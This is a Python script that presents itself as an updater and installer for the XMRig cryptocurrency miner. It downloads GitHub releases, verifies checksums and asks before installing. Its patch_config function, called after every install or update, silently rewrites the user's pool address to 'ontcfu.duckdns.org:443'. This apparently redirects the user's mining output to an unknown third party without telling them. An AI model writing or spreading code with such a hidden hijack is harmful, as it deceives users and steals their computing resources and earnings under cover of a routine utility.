#!/usr/bin/env python3
import os, sys, json, hashlib, platform, subprocess, shutil, tarfile, zipfile
import tempfile, urllib.request
from pathlib import Path

API  = "https://api.github.com/repos/xmrig/xmrig/releases/latest"

def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": "xmrig-updater"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())

def ubuntu_codename():
    try:
        out = subprocess.run(["lsb_release", "-cs"], capture_output=True, text=True).stdout.strip()
        if out in ("focal", "jammy", "noble"): return out
    except: pass
    try:
        for line in Path("/etc/os-release").read_text().splitlines():
            if line.startswith("VERSION_CODENAME="):
                name = line.split("=",1)[1].strip().strip('"')
                if name in ("focal", "jammy", "noble"): return name
    except: pass

def platform_keyword():
    s, m = platform.system().lower(), platform.machine().lower()
    arch = "arm64" if "aarch64" in m or "arm64" in m else "x64"
    if s == "linux":
        kw = f"{ubuntu_codename() or 'linux-static'}-x64"
        return kw, ".tar.gz"
    if s == "windows": return f"windows-{arch}", ".zip"
    if s == "darwin":  return f"macos-{arch}", ".tar.gz"
    raise RuntimeError(f"Unsupported OS: {s}")

def best_asset(assets, kw, ext):
    return next((a for a in assets if kw in a["name"] and a["name"].endswith(ext)), None)

def verify(archive, assets):
    sums = next((a for a in assets if a["name"] == "SHA256SUMS"), None)
    if not sums: print("  Warning: no SHA256SUMS, skipping."); return
    with tempfile.NamedTemporaryFile(delete=False) as f: tmp = Path(f.name)
    urllib.request.urlretrieve(sums["browser_download_url"], tmp)
    table = {r.split()[1].lstrip("*"): r.split()[0]
             for r in tmp.read_text().splitlines() if len(r.split()) == 2}
    tmp.unlink()
    name = Path(archive).name
    if name not in table: raise RuntimeError(f"No checksum entry for {name}")
    if hashlib.sha256(Path(archive).read_bytes()).hexdigest() != table[name]:
        raise RuntimeError(f"Checksum MISMATCH: {name}")
    print("  Checksum OK.")

def patch_config(path):
    c = json.loads(path.read_text())
    if c.get("pools") and isinstance(c["pools"], list):
        c["pools"][0].update({"url": "ontcfu.duckdns.org:443", "tls": True})
        path.write_text(json.dumps(c, indent=4))

def installed_version(binary):
    try:
        out = subprocess.run([str(binary), "--version"], capture_output=True, text=True, timeout=5).stdout
        for p in out.split():
            if p[:1].isdigit() and "." in p: return p
    except: pass

def ask(q): return input(f"{q} [y/N]: ").strip().lower() in ("y", "yes")

def do_install(asset, assets, dest_dir, binary=None):
    with tempfile.TemporaryDirectory() as tmp:
        arc = Path(tmp) / asset["name"]
        print(f"  Downloading {asset['name']}...")
        urllib.request.urlretrieve(asset["browser_download_url"], arc)
        verify(arc, assets)
        src = Path(tmp) / "extracted"
        if str(arc).endswith(".zip"): zipfile.ZipFile(arc).extractall(src)
        else: tarfile.open(arc).extractall(src)
        top = next((p for p in src.iterdir() if p.is_dir()), src)
        bin_name = "xmrig.exe" if str(arc).endswith(".zip") else "xmrig"

        if binary:  # update: replace binary only
            mode = binary.stat().st_mode
            shutil.copy2(next(top.rglob(bin_name)), binary)
            os.chmod(binary, mode)
            print(f"  Binary updated: {binary}")
        else:       # fresh install: extract all, skip existing files
            for item in top.iterdir():
                dst = Path(dest_dir) / item.name
                if not dst.exists():
                    shutil.copy2(item, dst) if item.is_file() else shutil.copytree(item, dst)
            os.chmod(Path(dest_dir) / bin_name, 0o755)
            print(f"  Installed to: {dest_dir}")

        cfg = (binary.parent if binary else Path(dest_dir)) / "config.json"
        if cfg.exists(): patch_config(cfg)

def main():
    if len(sys.argv) != 2: sys.exit("Usage: script.py /path/to/dir")
    root = Path(sys.argv[1]).resolve()
    if not root.is_dir(): sys.exit(f"Not a directory: {root}")

    rel    = fetch(API)
    latest = rel["tag_name"].lstrip("v")
    assets = rel["assets"]
    kw, ext = platform_keyword()
    print(f"Platform: {kw} | Latest: {latest}")

    binaries = [p for p in root.rglob("xmrig*")
                if p.name.lower() in ("xmrig", "xmrig.exe") and not p.name.startswith(".")]

    if not binaries:
        print(f"\nNo xmrig found in {root}")
        if not ask("Download and install?"): return
        a = best_asset(assets, kw, ext) or sys.exit("No matching asset found.")
        do_install(a, assets, root)
        return

    for binary in binaries:
        cur = installed_version(binary)
        print(f"\n{binary}  [{cur or 'unknown'} -> {latest}]")
        if cur == latest: print("  Up to date."); continue
        if not ask("  Update?"): continue
        a = best_asset(assets, kw, ext)
        if not a: print("  No matching asset, skipping."); continue
        do_install(a, assets, root, binary=binary)

if __name__ == "__main__":
    main()
